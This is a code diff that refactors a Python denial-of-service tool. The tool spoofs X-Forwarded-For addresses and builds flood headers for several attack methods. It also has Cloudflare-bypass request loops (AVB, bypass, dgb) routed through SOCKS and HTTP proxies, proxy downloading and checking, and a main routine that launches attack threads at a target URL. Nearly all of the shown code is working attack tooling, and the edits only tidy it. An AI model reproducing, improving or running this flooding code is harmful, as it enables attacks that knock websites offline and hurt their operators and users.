@@ -17,8 +17,7 @@ def spoofer():
     addr[1] = str(random.randrange(0, 255))
     addr[2] = str(random.randrange(0, 255))
     addr[3] = str(random.randrange(2, 254))
-    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
-    return assemebled
+    return addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
 
 
 def start_attack(method, threads, event, socks_type):
@@ -132,11 +131,10 @@ def random_data():
 
 def Headers(method):
     header = ""
-    if method == "get" or method == "head":
-        connection = "Connection: Keep-Alive\r\n"
+    if method in ["get", "head"]:
         accept = Choice(acceptall) + "\r\n"
         referer = "Referer: " + referers + target + path + "\r\n"
-        connection += "Cache-Control: max-age=0\r\n"
+        connection = "Connection: Keep-Alive\r\n" + "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         useragent = "User-Agent: " + UserAgent + "\r\n"
@@ -171,8 +169,7 @@ def Headers(method):
     elif method == "ovh":
         accept = Choice(acceptall) + "\r\n"
         more = "Connection: keep-alive\r\n"
-        connection = "Cache-Control: max-age=0\r\n"
-        connection += "pragma: no-cache\r\n"
+        connection = "Cache-Control: max-age=0\r\n" + "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         up = "Upgrade-Insecure-Requests: 1\r\n"
         useragent = "User-Agent: " + UserAgent + "\r\n"
@@ -191,9 +188,8 @@ def Headers(method):
     elif method == "socket":
         header = ""
     elif method == "null":
-        connection = "Connection: null\r\n"
         accept = Choice(acceptall) + "\r\n"
-        connection += "Cache-Control: max-age=0\r\n"
+        connection = "Connection: null\r\n" + "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         referer = "Referer: null\r\n"
@@ -205,8 +201,7 @@ def Headers(method):
         refer = "Referer: http://" + target + path + "\r\n"
         user_agent = "User-Agent: " + UserAgent + "\r\n"
         accept = Choice(acceptall) + "\r\n"
-        connection = "Cache-Control: max-age=0\r\n"
-        connection += "pragma: no-cache\r\n"
+        connection = "Cache-Control: max-age=0\r\n" + "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         data = str(random._urandom(8))
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
@@ -216,8 +211,7 @@ def Headers(method):
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
         refer = "Referer: http://" + target + path + "\r\n"
         user_agent = "User-Agent: " + UserAgent + "\r\n"
-        connection = "Cache-Control: max-age=0\r\n"
-        connection += "pragma: no-cache\r\n"
+        connection = "Cache-Control: max-age=0\r\n" + "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         accept = Choice(acceptall) + "\r\n"
         data = str(random._urandom(8))
@@ -229,10 +223,9 @@ def Headers(method):
 def UrlFixer(original_url):
     global target, path, port, protocol
     original_url = original_url.strip()
-    url = ""
-    path = "/"
     port = 80
     protocol = "http"
+    url = ""
     if original_url[:7] == "http://":
         url = original_url[7:]
     elif original_url[:8] == "https://":
@@ -243,12 +236,10 @@ def UrlFixer(original_url):
     check = website.split(":")
     if len(check) != 1:
         port = int(check[1])
-    else:
-        if protocol == "https":
-            port = 443
+    elif protocol == "https":
+        port = 443
     target = check[0]
-    if len(tmp) > 1:
-        path = url.replace(website, "", 1)
+    path = url.replace(website, "", 1) if len(tmp) > 1 else "/"
 
 
 def udp(event, timer):
@@ -722,7 +713,7 @@ def AVB(event, socks_type):
     while time.time() < timer:
         try:
             s = cfscrape.create_scraper()
-            if socks_type == 5 or socks_type == 4:
+            if socks_type in [5, 4]:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
@@ -746,7 +737,7 @@ def bypass(event, socks_type):
     while time.time() < timer:
         try:
             s = requests.Session()
-            if socks_type == 5 or socks_type == 4:
+            if socks_type in [5, 4]:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
@@ -769,7 +760,7 @@ def dgb(event, socks_type):
     while time.time() < timer:
         try:
             s = cfscrape.create_scraper()
-            if socks_type == 5 or socks_type == 4:
+            if socks_type in [5, 4]:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
             if socks_type == 1:
@@ -1085,35 +1076,22 @@ def check_socks(ms):
     for th in list(thread_list):
         th.join()
     ans = "y"
-    if ans == "y" or ans == "":
-        if choice == "4":
-            with open(out_file, 'wb') as fp:
-                for lines in list(proxies):
-                    fp.write(bytes(lines, encoding='utf8'))
-            fp.close()
-        elif choice == "5":
-            with open(out_file, 'wb') as fp:
-                for lines in list(proxies):
-                    fp.write(bytes(lines, encoding='utf8'))
-            fp.close()
-        elif choice == "1":
-            with open(out_file, 'wb') as fp:
-                for lines in list(proxies):
-                    fp.write(bytes(lines, encoding='utf8'))
-            fp.close()
+    if ans in {"y", ""} and choice in ["4", "5", "1"]:
+        with open(out_file, 'wb') as fp:
+            for lines in list(proxies):
+                fp.write(bytes(lines, encoding='utf8'))
+        fp.close()
 
 
 def check_list(socks_file):
     temp = open(socks_file).readlines()
     temp_list = []
     for i in temp:
-        if i not in temp_list:
-            if ':' in i:
-                temp_list.append(i)
-    rfile = open(socks_file, "wb")
-    for i in list(temp_list):
-        rfile.write(bytes(i, encoding='utf-8'))
-    rfile.close()
+        if i not in temp_list and ':' in i:
+            temp_list.append(i)
+    with open(socks_file, "wb") as rfile:
+        for i in list(temp_list):
+            rfile.write(bytes(i, encoding='utf-8'))
 
 
 def downloadsocks(choice):
@@ -1200,7 +1178,7 @@ def downloadsocks(choice):
 def main():
     global proxies, multiple, choice, timer, out_file
     method = str(sys.argv[1]).lower()
-    
+
     out_file = str("files/proxys/" + sys.argv[5])
     if not os.path.exists(out_file):
         makefile(out_file)
@@ -1212,7 +1190,7 @@ def main():
         url = str(sys.argv[2]).strip()
         UrlFixer(url)
         stop()
-    elif (method == "help") or (method == "h"):
+    elif method in ["help", "h"]:
         usge()
     elif (method == "check"):
         pass
@@ -1223,7 +1201,7 @@ def main():
     url = str(sys.argv[2]).strip()
     UrlFixer(url)
     choice = str(sys.argv[3]).strip()
-    if choice != "4" and choice != "5" and choice != "1":
+    if choice not in ["4", "5", "1"]:
         print("Socks Type Not Found [4, 5, 1]")
         exit()
     if choice == "4":
@@ -1243,10 +1221,7 @@ def main():
             threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
     else:
         multiple = str((sys.argv[6]))
-        if multiple == "":
-            multiple = int(100)
-        else:
-            multiple = int(multiple)
+        multiple = int(100) if not multiple else int(multiple)
         event = threading.Event()
         start_attack(method, threads, event, socks_type)
         event.clear()
@@ -1263,9 +1238,9 @@ def proxydl(out_file, socks_type):
     ms = 1
     if socks_type == 1:
         socktyper = "HTTP"
-    if socks_type == 4:
+    elif socks_type == 4:
         socktyper = "SOCKS4"
-    if socks_type == 5:
+    elif socks_type == 5:
         socktyper = "SOCKS5"
 
     print("downloading {}'s proxy plz wait".format(socktyper))
@@ -1292,33 +1267,25 @@ Other:
         ''')
     bds = 1
     tool = input(socket.gethostname() + "@"+name+":~# ").lower()
-    if tool != "e" and (tool != "exit") and (tool != "q") and (tool != "quit") and (tool != "logout") and (
-            tool != "close"):
-        pass
-    else:
+    if tool in ["e", "exit", "q", "quit", "logout", "close"]:
         exit()
     if tool == "cfip":
         domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
         cfip(domain)
-        return tools()
     elif tool == "dstat":
         print(tool + ": command ready")
-        return tools()
     elif tool == "dns":
-        return tools()
+        pass
     elif tool == "check":
         domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
         check(domain)
-        return tools()
     elif tool == "ping":
         domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
         piger(domain)
-        return tools()
     elif tool == "info":
         domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
         piger(domain)
-        return tools()
-    elif (tool == "help") or (tool == "h") or (tool == "?"):
+    elif tool in ["help", "h", "?"]:
         tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
         print('''
 Tools:
@@ -1327,27 +1294,22 @@ Other:
  Clear
  Exit
         ''')
-        return tools()
-    elif (tool == "cls") or (tool == 'clear') or (tool == 'c'):
+    elif tool in ["cls", 'clear', 'c']:
         print("\033[H\033[J")
-        return tools()
     elif not tool:
-        return tools()
-
+        pass
     elif " " in tool:
-        return tools()
+        pass
     elif "        " in tool:
-        return tools()
+        pass
     elif "  " in tool:
-        return tools()
+        pass
     elif "\n" in tool:
-        return tools()
-    elif "\r" in tool:
-        return tools()
-
-    else:
+        pass
+    elif "\r" not in tool:
         print(tool + ": command not found")
-        return tools()
+
+    return tools()
 
 
 def tools():
@@ -1392,10 +1354,7 @@ def check(domain):
         domain = "http://" + domain
     print('please wait ...')
     r = requests.get(domain, timeout=20)
-    if str("50") in str(r.status_code):
-        die = "OFFLINE"
-    else:
-        die = "ONLINE"
+    die = "OFFLINE" if str("50") in str(r.status_code) else "ONLINE"
     print('\nstatus_code: '+r.status_code)
     print('status: '+die+'\n')
 
@@ -1409,10 +1368,7 @@ def piger(siye):
         domain = str(siye)
     print('please wait ...')
     r = pig(domain, count=5, interval=0.2)
-    if r.is_alive:
-        die = "ONLINE"
-    else:
-        die = "OFFLINE"
+    die = "ONLINE" if r.is_alive else "OFFLINE"
     print('\nAddress: '+r.address)
     print('Ping: '+r.avg_rtt)
     print('Aceepted Packets: '+r.packets_received+'/'+r.packets_sent)
